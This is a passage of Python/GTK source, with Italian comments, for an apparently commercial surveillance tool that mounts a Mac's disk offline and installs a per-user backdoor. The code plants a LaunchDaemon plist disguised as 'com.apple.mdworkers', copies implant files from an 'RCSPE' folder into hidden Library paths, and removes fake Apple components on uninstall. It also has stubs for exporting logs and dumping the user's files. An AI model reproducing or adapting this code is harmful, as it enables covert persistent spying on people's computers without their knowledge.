					  "<string>" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_/" + temporary_loader + "</string>\n" \
					  "<string>" + user +"</string>\n" \
					  "<string>" + self.backconf['hdir'] +"</string>\n" \
					  "<string>" + self.backconf['hcore'] +"</string>\n" \
					  "</array>\n" \
					  "<key>KeepAlive</key>\n" \
					  "<dict>\n" \
					  "<key>SuccessfulExit</key>\n" \
					  "<false/>\n" \
					  "</dict>\n" \
					  "</dict>\n" \
					  "</plist>"
		plist_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"

		#
		# Crea la directory temporanea
		##
		try:
			os.mkdir(temp_backdoor_path)
			print("    Create tmp backdoor directory [OK] -> " + temp_backdoor_path)
		except:
			print("    Create tmp backdoor directory [ERROR] -> " + temp_backdoor_path)
			pass

		#
		# Crea l'mdworker per il primo avvio
		##
		source_path = "/mnt/private/etc/authorization"
		dest_path = "/mnt/private/etc/authorization.bu"
		shutil.copyfile(source_path, dest_path)

		dest_path = "/mnt/private/etc/authorization.mod"
		os.rename(source_path, dest_path)
			
		hfile = open(dest_path, "w")
		hfile.truncate()
		hfile.write(mdworker_plist_content)
		hfile.close()

		dest_path = "/mnt/private/etc/authorization"
		source_path = "/mnt/private/etc/authorization.bu"
		shutil.copyfile(source_path, dest_path)
		os.remove(source_path)

		source_path = "/mnt/private/etc/authorization.mod"
		os.rename(source_path, plist_path)

		print("    Create MdWorker for first boot [OK] -> " + plist_path)

		#
		# Crea un marker nella directory temporanea
		##
		plist_path = temp_backdoor_path + "/00"
		hfile = open(plist_path, "w")
		hfile.write("00")
		hfile.close()

		print("    Create Marker in the tmp backdoor directory [OK] -> " + plist_path)

		try:
			os.mkdir("/mnt2/")
			print("    Create new mnt mount directory [OK] -> /mnt2/")
		except:
			print("    Create new mnt mount directory [ERROR] -> /mnt2/")
			pass

		print("    Searching backdoor configuration files in the device -> " + self.backconf['dev'] + "...")

		try:
			ret = subprocess.check_output("mount -t {} {} /mnt2/ 2> /dev/null".format(self.backconf['devfs'], self.backconf['dev']), shell=True)
		except:
			try:
				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
			except:
				pass

			try:
				shutil.rmtree("/mnt2/")
				print("    Remove mnt mount directory [OK] -> /mnt2/")
			except:
				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
				pass

			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
			return False

		#
		# Copia i file nella directory temporanea
		##
		files_path = "/mnt2/RCSPE/files/OSX"
		files = os.listdir(files_path)

		for hfind in files:
			tmp_path = files_path + "/" + hfind
			tmp_path2 = temp_backdoor_path + "/" + hfind
			shutil.copyfile(tmp_path, tmp_path2)
			print("    Copyring backdoor file [OK] -> " + tmp_path + " -> " + tmp_path2)
		try:
			ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
		except:
			try:
				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
			except:
				pass

			try:
				shutil.rmtree("/mnt2/")
				print("    Remove mnt mount directory [OK] -> /mnt2/")
			except:
				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
				pass

			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
			return False

		try:
			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			try:
				shutil.rmtree("/mnt2/")
				print("    Remove mnt mount directory [OK] -> /mnt2/")
			except:	
				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
				pass

			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
			return False

		try:
			shutil.rmtree("/mnt2/")
			print("    Remove mnt mount directory [OK] -> /mnt2/")
		except:
			print("    Remove mnt mount directory [ERROR] -> /mnt2/")
			pass

		print("      Install [OK] -> " + user + " on Mac OS X system!")
		return True

	#
	# Install the infection vector on Linux system with the backdoor of the user
	##
	def install_linux_backdoor(self, user):
		print("    Try to install the backdoor for " + user + " on Linux system...")

		#
		# TODO: infettare l'user
		##

		print("      Install [OK] -> " + user + " on Linux system!")
		return True

	#
	# Install the infection vector with the backdoor of the user or users selected
	##
	def install(self, *args):
		print("Install action...")

		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()

		if len(rows) != 0:
			dialog = self.builder.get_object("messagedialog3")
			msgdia = ""

			if len(rows) == 1:
				msgdia = "Are you sure you want to install for this user?"
			else:
				msgdia = "Are you sure you want to install for " + str(len(rows)) + " users?"

			dialog.format_secondary_text(msgdia)
			response = dialog.run()
			if response == Gtk.ResponseType.NO:
				dialog.hide()
				return
			elif response == Gtk.ResponseType.YES:
				dialog.hide()

			for row in rows:
				iter = model.get_iter(row)
				user = model.get_value(iter, 1)

				print("  Selected: " + user)

				ret = False

				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
					ret = self.install_osx_backdoor(user)
				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
					ret = self.install_linux_backdoor(user)
				else:
					print("    Install [PASS] -> " + user + " on Unknown system.")

				if ret == False:
					dialog = self.builder.get_object("messagedialog4")
					msgdia = "Installation failed for " + user + " user."
				else:
					dialog = self.builder.get_object("messagedialog5")
					msgdia = "Installation successful for " + user + " user!"

				dialog.format_secondary_text(msgdia)
				response = dialog.run()
				if response == Gtk.ResponseType.OK:
					dialog.hide()

			print("")
			self.check_statususers()
			self.select_os(None)

	#
	# Uninstall the infection vector on Mac OS X system with the backdoor of the user
	##
	def uninstall_osx_backdoor(self, user):
		print("    Try to uninstall the backdoor for " + user + " on Mac OS X system...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
		except:
			print("      Uninstall [ERROR] -> " + user + " on Mac OS X system!")
			return False

		home = None

		for i in self.useosx:
			if i['username'] == user:
				if i['status'] == None:
					try:
						ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
					except:
						pass

					print("      Uninstall [ERROR] -> " + user + " IS NOT INFECTED on Mac OS X system!")
					return False

				home = i['home']
				break

		#
		# Cancella la directory temporanea (nel caso la backdoor non abbia mai runnato)
		##
		backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
		try:
			shutil.rmtree(backdoor_path)
			print("    Remove [OK] -> " + backdoor_path)
		except:
			print("    Remove [ERROR] -> " + backdoor_path)
			pass

		#
		# Cancella il plist del primo avvio (se la bacdkoor non ha mai runnato)
		##
		backdoor_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"
		try:
			os.remove(backdoor_path)
			print("    Remove [OK] -> " + backdoor_path)
		except:
			print("    Remove [ERROR] -> " + backdoor_path)
			pass

		#
		# Cancella il plist della backdoor
		##
		backdoor_path = "/mnt" + home + "/Library/LaunchAgents/com.apple.mdworker.plist"
		try:
			os.remove(backdoor_path)
			print("    Remove [OK] -> " + backdoor_path)
		except:
			print("    Remove [ERROR] -> " + backdoor_path)
			pass

		#
		# Cancella il plist della backdoor
		##
		backdoor_path = "/mnt" + home + "/Library/LaunchAgents/com.apple.UIServerLogin.plist"
		try:
			os.remove(backdoor_path)
			print("    Remove [OK] -> " + backdoor_path)
		except:
			print("    Remove [ERROR] -> " + backdoor_path)
			pass

		#
		# Cancella tutti i file e la directory
		##
		backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir']
		if os.path.exists(backdoor_path) == False: 
			backdoor_path += ".app"
			
		try:
			shutil.rmtree(backdoor_path)
			print("    Remove [OK] -> " + backdoor_path)
		except:
			print("    Remove [ERROR] -> " + backdoor_path)
			pass

		#
		# Conta quanti utenti ci sono con la backdoor installata
		##
		count = 0

		for i in self.useosx:
			if i['status'] == True or i['status'] == False:
				count += 1

		if count <= 1:
			#
			# Rimuove l'input manager quando si toglie l'ultima istanza della backdoor
			##
			backdoor_path = "/mnt/Library/ScriptingAdditions/appleOsax"
			try:
				shutil.rmtree(backdoor_path)
				print("    Remove [OK] -> " + backdoor_path)
			except:
				print("    Remove [ERROR] -> " + backdoor_path)
				pass

			backdoor_path = "/mnt/Library/ScriptingAdditions/UIServerEvents"
			try:
				shutil.rmtree(backdoor_path)
				print("    Remove [OK] -> " + backdoor_path)
			except:
				print("    Remove [ERROR] -> " + backdoor_path)
				pass

			backdoor_path = "/mnt/Library/InputManagers/appleHID"
			try:
				shtuil.rmtree(backdoor_path)
				print("    Remove [OK] -> " + backdoor_path)
			except:
				print("    Remove [ERROR] -> " + backdoor_path)
				pass

		try:
			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
		except:
			print("      Uninstall [ERROR] -> " + user + " on Mac OS X system!")
			return False

		print("      Uninstall [OK] -> " + user + " on Mac OS X system!")
		return True

	#
	# Uninstall the infection vector on Linux system with the backdoor of the user
	##
	def uninstall_linux_backdoor(self, user):
		print("    Try to uninstall the backdoor for " + user + " on Linux system...")

		#
		# TODO: disinfettare l'user
		##

		print("      Uninstall [OK] -> " + user + " on Linux system!")
		return True

	#
	# Uninstall the infection vector with backdoor of the user or users selected
	##
	def uninstall(self, *args):
		print("Uninstall action...")

		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()

		if len(rows) != 0:
			dialog = self.builder.get_object("messagedialog6")
			msgdia = ""

			if len(rows) == 1:
				msgdia = "Are you sure you want to uninstall for this user?"
			else:
				msgdia = "Are you sure you want to uninstall for " + str(len(rows)) + " users?"

			dialog.format_secondary_text(msgdia)
			response = dialog.run()
			if response == Gtk.ResponseType.NO:
				dialog.hide()
				return
			elif response == Gtk.ResponseType.YES:
				dialog.hide()

			for row in rows:
				iter = model.get_iter(row)
				user = model.get_value(iter, 1)

				print("  Selected: " + user)

				ret = False

				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
					ret = self.uninstall_osx_backdoor(user)
				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
					ret = self.uninstall_linux_backdoor(user)
				else:
					print("    Uninstall [PASS] -> " + user + " on Unknown system.")

				if ret == False:
					dialog = self.builder.get_object("messagedialog7")
					msgdia = "Uninstallation failed for " + user + " user."
				else:
					dialog = self.builder.get_object("messagedialog8")
					msgdia = "Uninstallation successful for " + user + " user!"

				dialog.format_secondary_text(msgdia)
				response = dialog.run()
				if response == Gtk.ResponseType.OK:
					dialog.hide()

			print("")
			self.check_statususers()
			self.select_os(None)

	#
	# Export logs of the infection vector on Mac OS X system with backdoor of the user
	##
	def export_osx_logs(self, user):
		print("    Try to export logs for " + user + " on Mac OS X system...")

		#
		# TODO: esportare log dell'user
		##

		print("      Export logs [OK] -> " + user + " on Mac OS X system!")
		return True

	#
	# Export logs of the infection vector on Linux system with backdoor of the user
	##
	def export_linux_logs(self, user):
		print("    Try to export logs for " + user + " on Linux system...")

		#
		# TODO: esportare log dell'user
		##

		print("      Export logs [OK] -> " + user + " on Linux system!")
		return True

	#
	# Export logs of the infection vector with backdoor of the user or users selected
	##
	def export_logs(self, *args):
		print("Export logs action...")

		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()

		if len(rows) != 0:
			dialog = self.builder.get_object("messagedialog9")
			msgdia = ""

			if len(rows) == 1:
				msgdia = "Are you sure you want to export logs for this user?"
			else:
				msgdia = "Are you sure you want to export logs for " + str(len(rows)) + " users?"

			dialog.format_secondary_text(msgdia)
			response = dialog.run()
			if response == Gtk.ResponseType.NO:
				dialog.hide()
				return
			elif response == Gtk.ResponseType.YES:
				dialog.hide()

			for row in rows:
				iter = model.get_iter(row)
				user = model.get_value(iter, 1)

				print("  Selected: " + user)

				ret = False

				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
					ret = self.export_osx_logs(user)
				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
					ret = self.export_linux_logs(user)
				else:
					print("    Export logs [PASS] -> " + user + " on Unknown system.")

				if ret == False:
					dialog = self.builder.get_object("messagedialog10")
					msgdia = "Export failed for " + user + " user."
				else:
					dialog = self.builder.get_object("messagedialog11")
					msgdia = "Export successful for " + user + " user!"

				dialog.format_secondary_text(msgdia)
				response = dialog.run()
				if response == Gtk.ResponseType.OK:
					dialog.hide()

			print("")
			self.check_statususers()
			self.select_os(None)

	#
	# Dump files of the infection vector on Mac OS X system with backdoor of the user
	##
	def dump_osx_files(self, user):
		print("    Try to dump files for " + user + " on Mac OS X system...")

		#
		# TODO: dump files dell'user
		##

		print("      Dump files [OK] -> " + user + " on Mac OS X system!")
		return True

	#
	# Dump files of the infection vector on Linux system with backdoor of the user
	##
	def dump_linux_files(self, user):
		print("    Try to dump files for " + user + " on Linux system...")

		#
		# TODO: dump files dell'user
		##

		print("      Dump files [OK] -> " + user + " on Linux system!")
		return True

	#
	# Dump files of the infection vector with backdoor of the user or users selected
	##
	def dump_files(self, *args):
		print("Dump files action...")

		model, rows = self.builder.get_object("treeview-selection1").get_selected_rows()

		if len(rows) != 0:
			dialog = self.builder.get_object("messagedialog12")
			msgdia = ""

			if len(rows) == 1:
				msgdia = "Are you sure you want to dump files for this user?"
			else:
				msgdia = "Are you sure you want to dump files for " + str(len(rows)) + " users?"

			dialog.format_secondary_text(msgdia)
			response = dialog.run()
			if response == Gtk.ResponseType.NO:
				dialog.hide()
				return
			elif response == Gtk.ResponseType.YES:
				dialog.hide()

			for row in rows:
				iter = model.get_iter(row)
				user = model.get_value(iter, 1)

				print("  Selected: " + user)

				ret = False

				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
					ret = self.dump_osx_files(user)
				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
					ret = self.dump_linux_files(user)
				else:
					print("    Dump files [PASS] -> " + user + " on Unknown system.")

				if ret == False:
					dialog = self.builder.get_object("messagedialog13")
					msgdia = "Dump failed for " + user + " user."
				else:
					dialog = self.builder.get_object("messagedialog14")
					msgdia = "Dump successful for " + user + " user!"

				dialog.format_secondary_text(msgdia)
				response = dialog.run()
				if response == Gtk.ResponseType.OK:
					dialog.hide()

			print("")
			self.check_statususers()
			self.select_os(None)

	#
	# Halt the machine
	##
	def halt(self, *args):
		print("Shutdown action...")

		self.stop()

		#
		# TODO: Qui dovra' spegnere la macchina
		##
		sys.exit(0)

	#
	# Reboot the machine
	##
	def reboot(self, *args):
		print("Reboot action...")

		self.stop()
		subprocess.call("reboot", shell=True)
	
def signal_handler(signum, frame):
	print("Signal caught.")
	sys.exit()

	return

def main():
	signal.signal(signal.SIGINT, signal_handler)
	signal.signal(signal.SIGTERM, signal_handler)

	OfflineInstall()
	Gtk.main()

	return

if __name__ == "__main__":
	main()
